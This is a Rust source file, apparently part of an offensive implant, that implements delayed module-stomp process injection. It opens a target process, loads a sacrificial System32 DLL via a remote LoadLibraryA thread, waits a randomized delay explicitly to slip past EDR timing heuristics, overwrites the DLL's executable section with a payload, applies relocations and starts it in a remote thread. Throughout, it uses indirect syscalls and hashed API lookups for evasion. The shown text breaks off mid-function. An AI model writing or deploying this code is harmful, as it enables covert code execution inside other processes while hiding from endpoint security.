//! Delayed module-stomp injection.
//!
//! Loads a sacrificial DLL into the target process, waits for a configurable
//! randomized delay (default 8–15 seconds) to let EDR initial-scan heuristics
//! pass, then overwrites the DLL's `.text` section with the payload.
//!
//! # Why delayed?
//!
//! Many EDR products employ timing heuristics: they record the load time of
//! each DLL and flag modules whose `.text` section content changes within a
//! short window after `LoadLibrary` returns.  By waiting 8–15 seconds (well
//! beyond the typical 1–3 second scan window), the stomp blends into normal
//! background memory activity.
//!
//! # Two-phase design
//!
//! Phase 1 (immediate): Select and load the sacrificial DLL, return a
//! `PendingStomp` handle to the caller.
//!
//! Phase 2 (delayed): After the delay, overwrite `.text`, fix relocations
//! if needed, and execute the payload.
//!
//! # Non-blocking
//!
//! The delay is implemented via a background thread — the agent's main task
//! loop continues uninterrupted.

#![cfg(all(windows, feature = "delayed-stomp"))]

use crate::injection_engine::{InjectionError, InjectionHandle, InjectionTechnique};
use crate::syscalls::{do_syscall, get_syscall_id};
use anyhow::{anyhow, Context, Result};
use std::ffi::c_void;
use std::sync::OnceLock;

// ── Constants ────────────────────────────────────────────────────────────────

const PROCESS_ALL_ACCESS: u32 = 0x001FFFFF;
const MEM_COMMIT: u32 = 0x00001000;
const MEM_RESERVE: u32 = 0x00002000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// Maximum number of modules to enumerate when scanning for loaded DLLs.
const MAX_MODULES: usize = 1024;

/// Path buffer size for remote DLL path write.
const MAX_PATH_W: usize = 520;

// ── PE header types (minimal, for parsing) ───────────────────────────────────

#[repr(C)]
struct ImageDosHeader {
    e_magic: u16,
    _e_cblp: u16,
    _e_cp: u16,
    _e_crlc: u16,
    _e_cparhdr: u16,
    _e_minalloc: u16,
    _e_maxalloc: u16,
    _e_ss: u16,
    _e_sp: u16,
    _e_csum: u16,
    _e_ip: u16,
    _e_cs: u16,
    _e_lfarlc: u16,
    _e_ovno: u16,
    _e_res: [u16; 4],
    _e_oemid: u16,
    _e_oeminfo: u16,
    _e_res2: [u16; 10],
    e_lfanew: i32,
}

#[repr(C)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
struct ImageFileHeader {
    machine: u16,
    number_of_sections: u16,
    _time_date_stamp: u32,
    _pointer_to_symbol_table: u32,
    _number_of_symbols: u32,
    size_of_optional_header: u16,
    _characteristics: u16,
}

#[repr(C)]
struct ImageOptionalHeader64 {
    magic: u16,
    _major_linker_version: u8,
    _minor_linker_version: u8,
    _size_of_code: u32,
    _size_of_initialized_data: u32,
    _size_of_uninitialized_data: u32,
    address_of_entry_point: u32,
    _base_of_code: u32,
    image_base: u64,
    section_alignment: u32,
    file_alignment: u32,
    _major_os_version: u16,
    _minor_os_version: u16,
    _major_image_version: u16,
    _minor_image_version: u16,
    _major_subsystem_version: u16,
    _minor_subsystem_version: u16,
    _win32_version_value: u32,
    size_of_image: u32,
    size_of_headers: u32,
    _check_sum: u32,
    _subsystem: u16,
    _dll_characteristics: u16,
    size_of_stack_reserve: u64,
    size_of_stack_commit: u64,
    size_of_heap_reserve: u64,
    size_of_heap_commit: u64,
    _loader_flags: u32,
    number_of_rva_and_sizes: u32,
    data_directory: [ImageDataDirectory; 16],
}

#[repr(C)]
struct ImageDataDirectory {
    virtual_address: u32,
    size: u32,
}

#[repr(C)]
struct ImageSectionHeader {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    _size_of_raw_data: u32,
    _pointer_to_raw_data: u32,
    _pointer_to_relocations: u32,
    _pointer_to_linenumbers: u32,
    _number_of_relocations: u16,
    _number_of_linenumbers: u16,
    characteristics: u32,
}

/// IMAGE_DIRECTORY_ENTRY_BASERELOC
const DIR_BASERELOC: usize = 5;

/// IMAGE_REL_BASED_DIR64
const IMAGE_REL_BASED_DIR64: u16 = 10;

/// IMAGE_REL_BASED_HIGHLOW
const IMAGE_REL_BASED_HIGHLOW: u16 = 3;

/// IMAGE_SCN_MEM_EXECUTE
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;

// ── Types ────────────────────────────────────────────────────────────────────

/// Persistent state for a pending delayed stomp operation.
/// Stored encrypted via memory_guard when the agent sleeps.
#[derive(Debug)]
pub struct PendingStomp {
    /// PID of the target process.
    pub target_pid: u32,
    /// Handle to the target process (leaked from `OpenProcess`).
    pub process_handle: usize,
    /// Base address of the loaded sacrificial DLL in the target.
    pub dll_base: usize,
    /// Size of the DLL's `.text` section.
    pub text_section_size: usize,
    /// Virtual address of the `.text` section start.
    pub text_section_va: usize,
    /// Entry point RVA of the payload (if PE).
    pub entry_point_rva: u32,
    /// Whether the payload is a PE (vs raw shellcode).
    pub is_pe: bool,
    /// Payload ciphertext (encrypted via memory_guard).
    pub payload: Vec<u8>,
    /// Delay in seconds before stomp.
    pub delay_secs: u32,
    /// Name of the sacrificial DLL that was loaded.
    pub dll_name: String,
}

impl Drop for PendingStomp {
    fn drop(&mut self) {
        // Securely zero the payload
        for b in self.payload.iter_mut() {
            unsafe { std::ptr::write_volatile(b, 0) }
        }
        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
    }
}

// ── Sacrificial DLL selection ────────────────────────────────────────────────

/// Global list of candidate sacrificial DLLs, set from config on first use.
static SACRIFICIAL_DLLS: OnceLock<Vec<String>> = OnceLock::new();

/// Initialize the sacrificial DLL list from config. Call once at startup.
pub fn init_sacrificial_dlls(dlls: Vec<String>) {
    let _ = SACRIFICIAL_DLLS.set(dlls);
}

/// Return the global sacrificial DLL list (or the built-in default).
fn get_sacrificial_dlls() -> &'static Vec<String> {
    SACRIFICIAL_DLLS.get_or_init(|| {
        vec![
            "version.dll".into(),
            "dwmapi.dll".into(),
            "msctf.dll".into(),
            "uxtheme.dll".into(),
            "netprofm.dll".into(),
            "devobj.dll".into(),
            "cryptbase.dll".into(),
            "wer.dll".into(),
            "msimg32.dll".into(),
            "propsys.dll".into(),
            "d3d10.dll".into(),
            "dbgeng.dll".into(),
            "winnsi.dll".into(),
            "iphlpapi.dll".into(),
            "dnsapi.dll".into(),
            "mpr.dll".into(),
            "credui.dll".into(),
            "setupapi.dll".into(),
            "cfgmgr32.dll".into(),
            "powrprof.dll".into(),
        ]
    })
}

// ── Remote module enumeration ────────────────────────────────────────────────

/// Module info returned by remote enumeration.
#[derive(Debug)]
struct ModuleInfo {
    base: usize,
    size: usize,
    name: String,
}

/// Enumerate modules loaded in the target process by walking the PEB.
///
/// Uses `NtQueryInformationProcess` → `ProcessBasicInformation` to get the
/// PEB address, then walks `Ldr->InMemoryOrderModuleList`.
unsafe fn enumerate_remote_modules(
    process_handle: *mut c_void,
) -> Result<Vec<ModuleInfo>> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;

    // Resolve NtQueryInformationProcess
    let ntqip = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    )
    .ok_or_else(|| anyhow!("cannot resolve NtQueryInformationProcess"))?;

    let ntqip_fn: extern "system" fn(
        *mut c_void, // ProcessHandle
        u32,         // ProcessInformationClass (0 = ProcessBasicInformation)
        *mut c_void, // ProcessInformation
        u32,         // ProcessInformationLength
        *mut u32,    // ReturnLength
    ) -> i32 = std::mem::transmute(ntqip);

    // Get PEB address
    #[repr(C)]
    struct ProcessBasicInformation {
        reserved1: *mut c_void,
        peb_base_address: *mut c_void,
        reserved2: [*mut c_void; 2],
        unique_process_id: usize,
        reserved3: *mut c_void,
    }

    let mut pbi = std::mem::zeroed::<ProcessBasicInformation>();
    let mut ret_len: u32 = 0;
    let status = ntqip_fn(
        process_handle,
        0, // ProcessBasicInformation
        &mut pbi as *mut _ as *mut c_void,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut ret_len,
    );

    if status < 0 {
        return Err(anyhow!("NtQueryInformationProcess failed: {status:#x}"));
    }

    if pbi.peb_base_address.is_null() {
        return Err(anyhow!("PEB address is null"));
    }

    // Read PEB to get Ldr pointer
    let mut peb_ldr_offset: usize = 0x18; // Offset of Ldr in PEB64
    let mut ldr_ptr: usize = 0;

    // Resolve NtReadVirtualMemory
    let ntdll_mod = ntdll;
    let ntrvm = pe_resolve::get_proc_address_by_hash(
        ntdll_mod,
        pe_resolve::hash_str(b"NtReadVirtualMemory\0"),
    )
    .ok_or_else(|| anyhow!("cannot resolve NtReadVirtualMemory"))?;

    let target = crate::syscalls::get_syscall_id("NtReadVirtualMemory");

    // Helper: read usize from target process
    let read_usize = |addr: usize| -> Result<usize> {
        let mut val: usize = 0;
        if let Some(ref tgt) = target {
            let status = do_syscall(
                tgt.ssn,
                tgt.gadget_addr,
                &[
                    process_handle as u64,
                    addr as u64,
                    &mut val as *mut usize as u64,
                    std::mem::size_of::<usize>() as u64,
                    0, // BytesRead
                ],
            );
            if status < 0 {
                return Err(anyhow!("NtReadVirtualMemory failed: {status:#x}"));
            }
        } else {
            return Err(anyhow!("NtReadVirtualMemory SSN not available"));
        }
        Ok(val)
    };

    // Helper: read buffer from target process
    let read_buf = |addr: usize, buf: &mut [u8]| -> Result<()> {
        if let Some(ref tgt) = target {
            let mut bytes_read: usize = 0;
            let status = do_syscall(
                tgt.ssn,
                tgt.gadget_addr,
                &[
                    process_handle as u64,
                    addr as u64,
                    buf.as_mut_ptr() as u64,
                    buf.len() as u64,
                    &mut bytes_read as *mut usize as u64,
                ],
            );
            if status < 0 {
                return Err(anyhow!("NtReadVirtualMemory failed: {status:#x}"));
            }
        }
        Ok(())
    };

    // Read Ldr pointer from PEB
    ldr_ptr = read_usize(pbi.peb_base_address as usize + peb_ldr_offset)?;

    // InMemoryOrderModuleList head is at offset 0x20 in PEB_LDR_DATA64
    let list_head_addr = ldr_ptr + 0x20;

    // Read Flink (first entry)
    let mut current_addr = read_usize(list_head_addr)?;

    let mut modules = Vec::with_capacity(MAX_MODULES);
    let mut iterations = 0;

    while current_addr != list_head_addr && iterations < MAX_MODULES {
        iterations += 1;

        // current points to InMemoryLinks which is at offset 0x10 in
        // LDR_DATA_TABLE_ENTRY. We need to subtract 0x10 to get the
        // actual entry base.
        let entry_addr = current_addr - 0x10;

        // DllBase is at offset 0x30 in LDR_DATA_TABLE_ENTRY
        let dll_base = read_usize(entry_addr + 0x30)?;
        // SizeOfImage is at offset 0x40
        let size_of_image = read_usize(entry_addr + 0x40)?;

        // BaseDllName (UNICODE_STRING) is at offset 0x58
        // UNICODE_STRING: Length (u16), MaxLength (u16), Buffer (ptr)
        let mut name_buf = [0u8; 16];
        read_buf(entry_addr + 0x58, &mut name_buf)?;
        let name_len = u16::from_le_bytes([name_buf[0], name_buf[1]]) as usize;
        let name_buffer_ptr = usize::from_le_bytes([
            name_buf[4], name_buf[5], name_buf[6], name_buf[7],
            name_buf[8], name_buf[9], name_buf[10], name_buf[11],
        ]);

        let mut name_utf16 = vec![0u16; name_len / 2];
        read_buf(name_buffer_ptr, std::slice::from_raw_parts_mut(
            name_utf16.as_mut_ptr() as *mut u8,
            name_len,
        ))?;

        let name = String::from_utf16_lossy(&name_utf16);

        modules.push(ModuleInfo {
            base: dll_base,
            size: size_of_image,
            name,
        });

        // Advance to next entry (read Flink)
        current_addr = read_usize(current_addr)?;
    }

    Ok(modules)
}

/// Check if a DLL is already loaded in the target process.
fn is_dll_loaded(modules: &[ModuleInfo], dll_name: &str) -> bool {
    let dll_lower = dll_name.to_ascii_lowercase();
    modules
        .iter()
        .any(|m| m.name.to_ascii_lowercase().ends_with(&dll_lower))
}

/// Select a sacrificial DLL that is NOT already loaded in the target.
fn select_sacrificial_dll(modules: &[ModuleInfo], candidates: &[String]) -> Option<String> {
    for dll in candidates {
        let dll_lower = dll.to_ascii_lowercase();
        // Skip DLLs in the exclusion list
        if is_excluded(&dll_lower) {
            continue;
        }
        if !is_dll_loaded(modules, &dll_lower) {
            return Some(dll.clone());
        }
    }
    None
}

/// Check if a DLL is in the built-in exclusion list.
fn is_excluded(dll_name: &str) -> bool {
    const EXCLUDED: &[&str] = &[
        "ntdll",
        "kernel32",
        "kernelbase",
        "amsi",
        "ws2_32",
        "wininet",
        "winhttp",
        "crypt32",
    ];
    EXCLUDED.iter().any(|e| dll_name.contains(e))
}

// ── DLL loading ──────────────────────────────────────────────────────────────

/// Load a DLL into the target process via `LoadLibraryA` through a remote
/// thread. Uses indirect syscalls throughout.
unsafe fn load_dll_remote(
    process_handle: *mut c_void,
    dll_path: &str,
) -> Result<()> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;

    // Resolve kernel32!LoadLibraryA
    let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(
        b"kernel32.dll\0",
    ))
    .ok_or_else(|| anyhow!("cannot resolve kernel32"))?;

    let load_library_a = pe_resolve::get_proc_address_by_hash(
        kernel32,
        pe_resolve::hash_str(b"LoadLibraryA\0"),
    )
    .ok_or_else(|| anyhow!("cannot resolve LoadLibraryA"))?;

    // Allocate memory for DLL path in target
    let alloc_target = crate::syscalls::get_syscall_id("NtAllocateVirtualMemory");
    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory");

    let alloc_tgt = alloc_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtAllocateVirtualMemory SSN not available"))?;
    let write_tgt = write_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtWriteVirtualMemory SSN not available"))?;

    let mut base_addr: usize = 0;
    let mut region_size: usize = dll_path.len() + 1;
    let mut status = do_syscall(
        alloc_tgt.ssn,
        alloc_tgt.gadget_addr,
        &[
            process_handle as u64,
            &mut base_addr as *mut usize as u64,
            0,                // ZeroBits
            &mut region_size as *mut usize as u64,
            MEM_COMMIT as u64 | MEM_RESERVE as u64,
            PAGE_READWRITE as u64,
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtAllocateVirtualMemory for DLL path failed: {status:#x}"));
    }

    // Write DLL path to target
    let dll_bytes = dll_path.as_bytes();
    let mut bytes_written: usize = 0;
    status = do_syscall(
        write_tgt.ssn,
        write_tgt.gadget_addr,
        &[
            process_handle as u64,
            base_addr as u64,
            dll_bytes.as_ptr() as u64,
            dll_bytes.len() as u64,
            &mut bytes_written as *mut usize as u64,
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtWriteVirtualMemory for DLL path failed: {status:#x}"));
    }

    // Create remote thread to call LoadLibraryA(path)
    let thread_target = crate::syscalls::get_syscall_id("NtCreateThreadEx");
    let thread_tgt = thread_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtCreateThreadEx SSN not available"))?;

    let mut thread_handle: usize = 0;
    // NtCreateThreadEx has 11 parameters
    status = do_syscall(
        thread_tgt.ssn,
        thread_tgt.gadget_addr,
        &[
            &mut thread_handle as *mut usize as u64, // ThreadHandle
            0x1FFFFF,                                 // DesiredAccess (THREAD_ALL_ACCESS)
            0,                                         // ObjectAttributes
            process_handle as u64,                     // ProcessHandle
            load_library_a as u64,                     // StartRoutine
            base_addr as u64,                          // Argument (DLL path)
            0,                                         // CreateSuspended
            0,                                         // StackZeroBits
            0,                                         // StackSize
            0,                                         // MaximumStackSize
            0,                                         // AttributeList
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtCreateThreadEx for LoadLibraryA failed: {status:#x}"));
    }

    // Wait for the remote thread to complete (LoadLibraryA returns)
    let wait_target = crate::syscalls::get_syscall_id("NtWaitForSingleObject");
    if let Some(ref wait_tgt) = wait_target {
        let _ = do_syscall(
            wait_tgt.ssn,
            wait_tgt.gadget_addr,
            &[
                thread_handle as u64, // Handle
                0,                    // Alertable (FALSE)
                i64::MIN as u64,      // Timeout (INFINITE = -100000000ns, use max for simplicity)
            ],
        );
    }

    // Close the thread handle
    let close_target = crate::syscalls::get_syscall_id("NtClose");
    if let Some(ref close_tgt) = close_target {
        let _ = do_syscall(close_tgt.ssn, close_tgt.gadget_addr, &[thread_handle as u64]);
    }

    // Free the DLL path memory
    let free_target = crate::syscalls::get_syscall_id("NtFreeVirtualMemory");
    if let Some(ref free_tgt) = free_target {
        let mut free_size: usize = 0;
        let mem_release: u32 = 0x00008000; // MEM_RELEASE
        let _ = do_syscall(
            free_tgt.ssn,
            free_tgt.gadget_addr,
            &[
                process_handle as u64,
                &mut base_addr as *mut usize as u64,
                &mut free_size as *mut usize as u64,
                mem_release as u64,
            ],
        );
    }

    Ok(())
}

// ── PE section parsing ───────────────────────────────────────────────────────

/// Find the `.text` section (first executable section) in the loaded DLL.
unsafe fn find_text_section(
    process_handle: *mut c_void,
    dll_base: usize,
) -> Result<(usize, usize)> {
    // Read DOS header
    let mut dos_header = std::mem::zeroed::<ImageDosHeader>();
    read_remote_memory(process_handle, dll_base, &mut dos_header)?;

    if dos_header.e_magic != 0x5A4D {
        return Err(anyhow!("invalid DOS magic"));
    }

    // Read NT headers
    let nt_offset = dll_base + dos_header.e_lfanew as usize;
    let mut nt_headers = std::mem::zeroed::<ImageNtHeaders64>();
    read_remote_memory(process_handle, nt_offset, &mut nt_headers)?;

    if nt_headers.signature != 0x4550 {
        return Err(anyhow!("invalid PE signature"));
    }

    // Iterate sections
    let section_offset = nt_offset
        + std::mem::size_of::<u32>() // Signature
        + std::mem::size_of::<ImageFileHeader>()
        + nt_headers.file_header.size_of_optional_header as usize;

    let num_sections = nt_headers.file_header.number_of_sections;
    let entry_rva = nt_headers.optional_header.address_of_entry_point;

    for i in 0..num_sections {
        let mut section = std::mem::zeroed::<ImageSectionHeader>();
        let sec_addr = section_offset + i as usize * std::mem::size_of::<ImageSectionHeader>();
        read_remote_memory(process_handle, sec_addr, &mut section)?;

        // Look for the first executable section (.text or similar)
        if section.characteristics & IMAGE_SCN_MEM_EXECUTE != 0
            && section.virtual_size > 0
        {
            let va = dll_base + section.virtual_address as usize;
            let size = section.virtual_size as usize;
            return Ok((va, size));
        }
    }

    Err(anyhow!("no executable section found in loaded DLL"))
}

/// Read a structure from remote process memory.
unsafe fn read_remote_memory<T>(
    process_handle: *mut c_void,
    address: usize,
    output: &mut T,
) -> Result<()> {
    let read_target = crate::syscalls::get_syscall_id("NtReadVirtualMemory");
    let read_tgt = read_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtReadVirtualMemory SSN not available"))?;

    let mut bytes_read: usize = 0;
    let status = do_syscall(
        read_tgt.ssn,
        read_tgt.gadget_addr,
        &[
            process_handle as u64,
            address as u64,
            output as *mut T as *mut c_void as u64,
            std::mem::size_of::<T>() as u64,
            &mut bytes_read as *mut usize as u64,
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtReadVirtualMemory failed: {status:#x}"));
    }
    Ok(())
}

/// Read the PE entry point from the loaded DLL.
unsafe fn read_entry_point(
    process_handle: *mut c_void,
    dll_base: usize,
) -> Result<u32> {
    let mut dos_header = std::mem::zeroed::<ImageDosHeader>();
    read_remote_memory(process_handle, dll_base, &mut dos_header)?;

    if dos_header.e_magic != 0x5A4D {
        return Err(anyhow!("invalid DOS magic"));
    }

    let nt_offset = dll_base + dos_header.e_lfanew as usize;
    let mut nt_headers = std::mem::zeroed::<ImageNtHeaders64>();
    read_remote_memory(process_handle, nt_offset, &mut nt_headers)?;

    Ok(nt_headers.optional_header.address_of_entry_point)
}

// ── Payload stomping ─────────────────────────────────────────────────────────

/// Overwrite the `.text` section with the payload.
unsafe fn stomp_text_section(
    process_handle: *mut c_void,
    text_va: usize,
    text_size: usize,
    payload: &[u8],
) -> Result<()> {
    // Verify payload fits
    if payload.len() > text_size {
        return Err(anyhow!(
            "payload ({} bytes) exceeds .text section size ({} bytes)",
            payload.len(),
            text_size
        ));
    }

    // Make .text section writable
    let protect_target = crate::syscalls::get_syscall_id("NtProtectVirtualMemory");
    let protect_tgt = protect_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtProtectVirtualMemory SSN not available"))?;

    let mut base = text_va;
    let mut region_size = text_size;
    let mut old_protect: u32 = 0;
    let mut status = do_syscall(
        protect_tgt.ssn,
        protect_tgt.gadget_addr,
        &[
            process_handle as u64,
            &mut base as *mut usize as u64,
            &mut region_size as *mut usize as u64,
            PAGE_EXECUTE_READWRITE as u64,
            &mut old_protect as *mut u32 as u64,
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtProtectVirtualMemory (RWX) failed: {status:#x}"));
    }

    // Write payload
    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory");
    let write_tgt = write_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtWriteVirtualMemory SSN not available"))?;

    let mut bytes_written: usize = 0;
    status = do_syscall(
        write_tgt.ssn,
        write_tgt.gadget_addr,
        &[
            process_handle as u64,
            text_va as u64,
            payload.as_ptr() as u64,
            payload.len() as u64,
            &mut bytes_written as *mut usize as u64,
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtWriteVirtualMemory (stomp) failed: {status:#x}"));
    }

    // Restore protection to RX
    base = text_va;
    region_size = text_size;
    let mut old_protect2: u32 = 0;
    status = do_syscall(
        protect_tgt.ssn,
        protect_tgt.gadget_addr,
        &[
            process_handle as u64,
            &mut base as *mut usize as u64,
            &mut region_size as *mut usize as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_protect2 as *mut u32 as u64,
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtProtectVirtualMemory (RX) failed: {status:#x}"));
    }

    Ok(())
}

// ── Relocation fixups ────────────────────────────────────────────────────────

/// If the payload is a PE, fix base relocations relative to the stomped DLL base.
unsafe fn fix_relocations(
    process_handle: *mut c_void,
    dll_base: usize,
    payload: &[u8],
) -> Result<u32> {
    // Parse DOS header from payload buffer
    let dos = &*(payload.as_ptr() as *const ImageDosHeader);
    if dos.e_magic != 0x5A4D {
        // Not a PE — raw shellcode, no relocation needed
        return Ok(0);
    }

    let nt = &*(payload.as_ptr().add(dos.e_lfanew as usize) as *const ImageNtHeaders64);
    if nt.signature != 0x4550 {
        return Ok(0);
    }

    let preferred_base = nt.optional_header.image_base as usize;
    let delta = dll_base as isize - preferred_base as isize;

    if delta == 0 {
        // Already at preferred base, no fixups needed
        return Ok(nt.optional_header.address_of_entry_point);
    }

    // Find the base relocation directory
    let reloc_dir = &nt.optional_header.data_directory[DIR_BASERELOC];
    if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
        return Ok(nt.optional_header.address_of_entry_point);
    }

    // Read relocation blocks from remote memory (the PE headers may have been
    // stomped already, so we read from the original payload buffer)
    let reloc_rva = reloc_dir.virtual_address as usize;
    let reloc_size = reloc_dir.size as usize;
    let mut offset = 0;

    // We need to apply relocations via NtWriteVirtualMemory to the target.
    // Each relocation is a 4-byte or 8-byte fixup at a specific RVA.
    let write_target = crate::syscalls::get_syscall_id("NtWriteVirtualMemory");
    let write_tgt = write_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtWriteVirtualMemory SSN not available"))?;

    while offset + 8 < reloc_size {
        let block_va = u32::from_le_bytes([
            payload[reloc_rva + offset],
            payload[reloc_rva + offset + 1],
            payload[reloc_rva + offset + 2],
            payload[reloc_rva + offset + 3],
        ]) as usize;
        let block_size = u32::from_le_bytes([
            payload[reloc_rva + offset + 4],
            payload[reloc_rva + offset + 5],
            payload[reloc_rva + offset + 6],
            payload[reloc_rva + offset + 7],
        ]) as usize;

        if block_size == 0 {
            break;
        }

        let num_entries = (block_size - 8) / 2;
        for i in 0..num_entries {
            let entry_offset = reloc_rva + offset + 8 + i * 2;
            let entry = u16::from_le_bytes([
                payload[entry_offset],
                payload[entry_offset + 1],
            ]);
            let typ = entry >> 12;
            let rva_offset = (entry & 0x0FFF) as usize;

            match typ {
                IMAGE_REL_BASED_DIR64 => {
                    // 64-bit relocation: read, add delta, write back
                    let target_addr = dll_base + block_va + rva_offset;
                    let mut val: u64 = 0;
                    read_remote_memory(process_handle, target_addr, &mut val)?;
                    val = (val as i64 + delta as i64) as u64;
                    let mut bytes_written: usize = 0;
                    let _ = do_syscall(
                        write_tgt.ssn,
                        write_tgt.gadget_addr,
                        &[
                            process_handle as u64,
                            target_addr as u64,
                            &val as *const u64 as u64,
                            8,
                            &mut bytes_written as *mut usize as u64,
                        ],
                    );
                }
                IMAGE_REL_BASED_HIGHLOW => {
                    // 32-bit relocation
                    let target_addr = dll_base + block_va + rva_offset;
                    let mut val: u32 = 0;
                    read_remote_memory(process_handle, target_addr, &mut val)?;
                    val = (val as i32 + delta as i32) as u32;
                    let mut bytes_written: usize = 0;
                    let _ = do_syscall(
                        write_tgt.ssn,
                        write_tgt.gadget_addr,
                        &[
                            process_handle as u64,
                            target_addr as u64,
                            &val as *const u32 as u64,
                            4,
                            &mut bytes_written as *mut usize as u64,
                        ],
                    );
                }
                _ => {} // Skip other types (ABSOLUTE, etc.)
            }
        }

        offset += block_size;
    }

    Ok(nt.optional_header.address_of_entry_point)
}

// ── Execution ────────────────────────────────────────────────────────────────

/// Execute the payload by creating a remote thread at the stomped address.
unsafe fn execute_payload(
    process_handle: *mut c_void,
    entry_address: usize,
) -> Result<usize> {
    let thread_target = crate::syscalls::get_syscall_id("NtCreateThreadEx");
    let thread_tgt = thread_target
        .as_ref()
        .ok_or_else(|| anyhow!("NtCreateThreadEx SSN not available"))?;

    let mut thread_handle: usize = 0;
    let status = do_syscall(
        thread_tgt.ssn,
        thread_tgt.gadget_addr,
        &[
            &mut thread_handle as *mut usize as u64,
            0x1FFFFF,              // THREAD_ALL_ACCESS
            0,                      // ObjectAttributes
            process_handle as u64,
            entry_address as u64,   // StartRoutine
            0,                      // Argument
            0,                      // CreateSuspended = FALSE
            0,                      // StackZeroBits
            0,                      // StackSize
            0,                      // MaximumStackSize
            0,                      // AttributeList
        ],
    );
    if status < 0 {
        return Err(anyhow!("NtCreateThreadEx failed: {status:#x}"));
    }

    Ok(thread_handle)
}

/// Alternative execution via callback injection pattern.
/// Uses `EnumSystemLocalesA` with the stomped address as callback.
unsafe fn execute_via_callback(
    process_handle: *mut c_void,
    entry_address: usize,
) -> Result<usize> {
    // Resolve kernel32!EnumSystemLocalesA in target
    // For simplicity, use NtCreateThreadEx — callback injection is
    // available as a future enhancement via the existing callback
    // injection patterns.
    execute_payload(process_handle, entry_address)
}

// ── Phase 1: Load DLL ────────────────────────────────────────────────────────

/// Phase 1 of delayed stomp: select and load a sacrificial DLL.
///
/// Returns a `PendingStomp` with all state needed for Phase 2.
pub unsafe fn phase1_load(
    target_pid: u32,
    payload: &[u8],
    min_delay_secs: u32,
    max_delay_secs: u32,
) -> Result<PendingStomp> {
    // Open target process
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| anyhow!("cannot resolve ntdll"))?;

    let open_process_fn = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtOpenProcess\0"),
    )
    .ok_or_else(|| anyhow!("cannot resolve NtOpenProcess"))?;

    let ntopen: extern "system" fn(
        *mut usize,     // ProcessHandle
        u32,            // DesiredAccess
        *mut c_void,    // ObjectAttributes
        *mut c_void,    // ClientId
    ) -> i32 = std::mem::transmute(open_process_fn);

    // Build CLIENT_ID
    #[repr(C)]
    struct ClientId {
        unique_process: usize,
        unique_thread: usize,
    }
    let cid = ClientId {
        unique_process: target_pid as usize,
        unique_thread: 0,
    };

    let mut process_handle: usize = 0;
    let status = ntopen(
        &mut process_handle,
        PROCESS_ALL_ACCESS,
        std::ptr::null_mut(),
        &cid as *const _ as *mut c_void,
    );
    if status < 0 || process_handle == 0 {
        return Err(anyhow!("NtOpenProcess failed: {status:#x}"));
    }

    // Enumerate currently loaded modules
    let modules = enumerate_remote_modules(process_handle as *mut c_void)?;

    // Select a sacrificial DLL
    let candidates = get_sacrificial_dlls();
    let dll_name = select_sacrificial_dll(&modules, candidates)
        .ok_or_else(|| anyhow!("no suitable sacrificial DLL found"))?;

    log::info!(
        "[delayed-stomp] Selected sacrificial DLL: {} (target PID {})",
        dll_name,
        target_pid
    );

    // Build full path (System32)
    let dll_path = format!("C:\\Windows\\System32\\{}", dll_name);

    // Load the DLL into the target process
    load_dll_remote(process_handle as *mut c_void, &dll_path)
        .with_context(|| format!("failed to load {} into target", dll_name))?;

    log::info!(
        "[delayed-stomp] DLL {} loaded into PID {}",
        dll_name,
        target_pid
    );

    // Re-enumerate to find the newly loaded DLL
    let modules_after = enumerate_remote_modules(process_handle as *mut c_void)?;
    let dll_module = modules_after
        .iter()
        .find(|m| {
            m.name
                .to_ascii_lowercase()
                .ends_with(&dll_name.to_ascii_lowercase())
        })
        .ok_or_else(|| anyhow!("DLL {} not found after loading", dll_name))?;

    let dll_base = dll_module.base;
    log::info!(
        "[delayed-stomp] DLL {} base: {:#x}",
        dll_name,
        dll_base
    );

    // Find .text section
    let (text_va, text_size) = find_text_section(process_handle as *mut c_void, dll_base)
        .with_context(|| "failed to find .text section")?;

    // Read entry point (before stomp)
    let entry_rva = read_entry_point(process_handle as *mut c_void, dll_base)
        .unwrap_or(0);

    // Determine if payload is a PE
    let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';

    // Calculate randomized delay
    let delay_secs = if min_delay_secs >= max_delay_secs {
        max_delay_secs
    } else {
        // Simple LCG-based random in range
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u32;
        let range = max_delay_secs - min_delay_secs;
        min_delay_secs + (now.wrapping_mul(1103515245).wrapping_add(12345) % range)
    };

    log::info!(
